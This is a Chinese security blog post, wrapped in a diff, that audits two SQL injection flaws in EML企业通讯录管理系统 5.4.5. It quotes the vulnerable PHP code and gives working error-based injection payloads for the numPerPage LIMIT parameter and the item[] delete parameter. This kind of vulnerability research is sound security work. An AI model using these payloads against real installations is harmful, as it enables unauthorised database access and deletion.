@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>EML企业通讯录管理系统两处sql注入漏洞分析 | sun1024</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="代码审计," />
+  
+
+  <meta name="description" content="0x00 前言最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么技术含量，但总归是一点记录。
+0x01 漏洞环境CMS：EML企业通讯录管理系统
+版本：5.4.5
+官方网站：http://bbs.emlsoft.com 
+更新时间：2018.7.26 
+测试环境：windows10+phpstudy+php5.5
+0x02 漏洞分析过滤函数：对于小">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EML企业通讯录管理系统两处sql注入漏洞分析">
+<meta property="og:url" content="http://yoursite.com/2018/08/12/EML企业通讯录管理系统两处注入分析/index.html">
+<meta property="og:site_name" content="sun1024">
+<meta property="og:description" content="0x00 前言最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么技术含量，但总归是一点记录。
+0x01 漏洞环境CMS：EML企业通讯录管理系统
+版本：5.4.5
+官方网站：http://bbs.emlsoft.com 
+更新时间：2018.7.26 
+测试环境：windows10+phpstudy+php5.5
+0x02 漏洞分析过滤函数：对于小">
+<meta property="og:image" content="http://yoursite.com/images/sqli1.PNG">
+<meta property="og:image" content="http://yoursite.com/images/sqli2.PNG">
+<meta property="og:updated_time" content="2018-08-12T13:33:47.192Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="EML企业通讯录管理系统两处sql注入漏洞分析">
+<meta name="twitter:description" content="0x00 前言最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么技术含量，但总归是一点记录。
+0x01 漏洞环境CMS：EML企业通讯录管理系统
+版本：5.4.5
+官方网站：http://bbs.emlsoft.com 
+更新时间：2018.7.26 
+测试环境：windows10+phpstudy+php5.5
+0x02 漏洞分析过滤函数：对于小">
+<meta name="twitter:image" content="http://yoursite.com/images/sqli1.PNG">
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+
+  <div class="post-header">
+   
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞环境"><span class="toc-text">0x01 漏洞环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-text">0x02 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#过滤函数："><span class="toc-text">过滤函数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第一处注入："><span class="toc-text">第一处注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二处注入："><span class="toc-text">第二处注入：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-后记"><span class="toc-text">0x03 后记</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-EML企业通讯录管理系统两处注入分析" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">EML企业通讯录管理系统两处sql注入漏洞分析</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.08.12</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>sun1024</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么技术含量，但总归是一点记录。</p>
+<h1 id="0x01-漏洞环境"><a href="#0x01-漏洞环境" class="headerlink" title="0x01 漏洞环境"></a>0x01 漏洞环境</h1><p>CMS：EML企业通讯录管理系统</p>
+<p>版本：5.4.5</p>
+<p>官方网站：<a href="http://bbs.emlsoft.com" target="_blank" rel="external">http://bbs.emlsoft.com</a> </p>
+<p>更新时间：2018.7.26 </p>
+<p>测试环境：windows10+phpstudy+php5.5</p>
+<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h4 id="过滤函数："><a href="#过滤函数：" class="headerlink" title="过滤函数："></a>过滤函数：</h4><p>对于小cms的sql注入的审计，一般存在两个方向：</p>
+<ol>
+<li>系统过滤机制的bypass;</li>
+<li>过滤的盲区(如：GPC之外的注入、limit/orderby之后的注入以及忘记过滤的地方等.);</li>
+</ol>
+<p>先来看看过滤函数：</p>
+<p>/lib/func.class.php:(27-37行)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//安全验证</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">_RunMagicQuotes</span><span class="params">(&amp;$svar)</span></span>&#123;</div><div class="line">	<span class="keyword">if</span>(!get_magic_quotes_gpc())	&#123;</div><div class="line">		<span class="keyword">if</span>( is_array($svar) )&#123;</div><div class="line">			<span class="keyword">foreach</span>($svar <span class="keyword">as</span> $k =&gt; $v) $svar[$k] = _RunMagicQuotes($v);</div><div class="line">		&#125;<span class="keyword">else</span>&#123;</div><div class="line">			$svar = addslashes($svar);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> $svar;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>未开启GPC则使用addslashes，也考虑到了数组的情况。感觉只要使用得当，就应该没有什么问题。</p>
+<h4 id="第一处注入："><a href="#第一处注入：" class="headerlink" title="第一处注入："></a>第一处注入：</h4><p>action/action.address.php：（60-68行）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">//设置分页</span></div><div class="line"><span class="keyword">if</span>($_POST[numPerPage]==<span class="string">""</span>)&#123;$numPerPage=<span class="string">"10"</span>;&#125;<span class="keyword">else</span>&#123;$numPerPage=$_POST[numPerPage];&#125;</div><div class="line"><span class="keyword">if</span>($_GET[pageNum]==<span class="string">""</span>||$_GET[pageNum]==<span class="string">"0"</span> )&#123;$pageNum=<span class="string">"0"</span>;&#125;<span class="keyword">else</span>&#123;$pageNum=($_GET[pageNum]<span class="number">-1</span>)*$numPerPage;&#125;</div><div class="line">$num=mysql_query(<span class="string">"select * from eml_address_list where 1=1 $search"</span>);<span class="comment">//当前频道条数</span></div><div class="line">$total=mysql_num_rows($num);<span class="comment">//总条数	</span></div><div class="line">$page=<span class="keyword">new</span> page(<span class="keyword">array</span>(<span class="string">'total'</span>=&gt;$total,<span class="string">'perpage'</span>=&gt;$numPerPage));</div><div class="line"></div><div class="line"><span class="comment">//查询</span></div><div class="line">$sql=<span class="string">"select * from eml_address_list  where 1=1  $search order by id desc limit $pageNum,$numPerPage"</span>;</div></pre></td></tr></table></figure>
+<p>$pageNum $numPerPage 未进行过滤处理直接带入了查询语句，但是前者应该无法利用：<code>（$pageNum=($_GET[pageNum]-1)*$numPerPage;）</code></p>
+<p>后者位于limit中并且存在order by，(<a href="http://www.freebuf.com/articles/web/57528.html" target="_blank" rel="external">参考文章</a>)可使用如下利用方式：</p>
+<p>POC：</p>
+<p><code>numPerPage=1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),0x7e);</code></p>
+<p><img src="/images/sqli1.PNG" alt=""></p>
+<h4 id="第二处注入："><a href="#第二处注入：" class="headerlink" title="第二处注入："></a>第二处注入：</h4><p>action/action.address.php：（186-206行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//批量删除</span></div><div class="line"><span class="keyword">if</span>($do==<span class="string">"del_all"</span>)&#123;</div><div class="line">	If_rabc($action,$do); <span class="comment">//检测权限</span></div><div class="line">	is_admin($action,$do); <span class="comment">//检测权限</span></div><div class="line">	$arr = $_POST[<span class="string">"item"</span>];</div><div class="line">	$count_arr=count($arr); </div><div class="line">	<span class="keyword">if</span>($count_arr==<span class="number">0</span>)&#123;</div><div class="line">	<span class="keyword">echo</span> error($msg); </div><div class="line">	<span class="keyword">exit</span>;</div><div class="line">	&#125;</div><div class="line">	$str = implode(<span class="string">"','"</span>,$arr);<span class="comment">//拼接字符</span></div><div class="line">	</div><div class="line">	$sql = <span class="string">"delete from eml_address_list WHERE id in('&#123;$str&#125;')"</span>;</div><div class="line">	</div><div class="line">	<span class="keyword">if</span>($db-&gt;query($sql))&#123;<span class="keyword">echo</span> success($msg,<span class="string">"?action=address"</span>);&#125;<span class="keyword">else</span>&#123;<span class="keyword">echo</span> error($msg);&#125;</div></pre></td></tr></table></figure>
+<p>item参数通过POST方法传入，使用implode函数进行数组=&gt;字符串，然后未经过滤直接进入delete语句执行，同样是忘记使用过滤函数的问题，不同点是必须传入数组才能利用，当然此处检测了is_admin，需要后台权限才能利用，比上一处利用条件更苛刻：</p>
+<p>POC:</p>
+<p><code>item[]=2&#39;) or updatexml(1,concat(0x7e,(version())),0) -- dd</code></p>
+<p><img src="/images/sqli2.PNG" alt=""></p>
+<h1 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h1><p>感觉简单的太简单，难的又审不动，要走的路还很长呢。。。 </p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持sun1024</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/05/21/Socks5_proxy/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/atom.xml"
+              rel="noopener noreferrer"
+              target="_blank"
+              >
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'sun1024';
+    
+    var disqus_url = 'http://yoursite.com/2018/08/12/EML企业通讯录管理系统两处注入分析/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//sun1024.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
